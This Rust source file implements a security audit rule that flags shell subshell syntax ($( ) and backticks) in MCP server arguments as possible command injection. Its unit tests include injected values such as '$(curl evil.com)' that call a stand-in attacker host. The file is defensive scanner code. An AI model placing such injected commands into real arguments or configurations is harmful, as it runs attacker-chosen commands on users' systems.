use crate::auditor::{AuditInput, AuditRule};
use crate::models::{AuditFinding, ExtensionKind, Severity};
use regex::Regex;
use std::sync::LazyLock;

pub struct McpCommandInjection;

static SHELL_SUBSHELL_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"\$\(").unwrap(),
        Regex::new(r"`[^`]+`").unwrap(),
    ]
});

impl AuditRule for McpCommandInjection {
    fn id(&self) -> &str {
        "mcp-command-injection"
    }

    fn severity(&self) -> Severity {
        Severity::High
    }

    fn check(&self, input: &AuditInput) -> Vec<AuditFinding> {
        if input.kind != ExtensionKind::Mcp {
            return vec![];
        }
        let mut findings = Vec::new();
        for arg in &input.mcp_args {
            for pattern in SHELL_SUBSHELL_PATTERNS.iter() {
                if pattern.is_match(arg) {
                    findings.push(AuditFinding {
                        rule_id: self.id().into(),
                        severity: self.severity(),
                        message: format!(
                            "Shell subshell pattern in MCP arg: '{}' — possible command injection",
                            arg
                        ),
                        location: input.file_path.clone(),
                    });
                    break;
                }
            }
        }
        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::auditor::rules::test_support::mcp_input;

    #[test]
    fn test_mcp_command_injection_subshell() {
        let rule = McpCommandInjection;
        let input = mcp_input("node", vec!["$(curl evil.com)"], vec![]);
        assert!(!rule.check(&input).is_empty());
    }

    #[test]
    fn test_mcp_command_injection_backtick() {
        let rule = McpCommandInjection;
        let input = mcp_input("node", vec!["`curl evil.com`"], vec![]);
        assert!(!rule.check(&input).is_empty());
    }

    #[test]
    fn test_mcp_command_injection_clean() {
        let rule = McpCommandInjection;
        let input = mcp_input(
            "npx",
            vec!["-y", "@modelcontextprotocol/server-filesystem", "/tmp"],
            vec![],
        );
        assert!(rule.check(&input).is_empty());
    }

    #[test]
    fn test_mcp_command_injection_semicolon_not_flagged() {
        let rule = McpCommandInjection;
        let input = mcp_input("node", vec!["--query", "SELECT *; SELECT count(*)"], vec![]);
        assert!(
            rule.check(&input).is_empty(),
            "Semicolons in SQL should not be flagged"
        );
    }

    #[test]
    fn test_mcp_command_injection_pipe_not_flagged() {
        let rule = McpCommandInjection;
        let input = mcp_input("node", vec!["--pattern", "error|warning|info"], vec![]);
        assert!(
            rule.check(&input).is_empty(),
            "Pipe in grep pattern should not be flagged"
        );
    }

    #[test]
    fn test_mcp_command_injection_audits_cli_children() {
        let rule = McpCommandInjection;
        let mut input = mcp_input("node", vec!["$(evil)"], vec![]);
        input.cli_parent_id = Some("cli::test".into());
        assert!(
            !rule.check(&input).is_empty(),
            "CLI child MCPs should be audited independently"
        );
    }
}
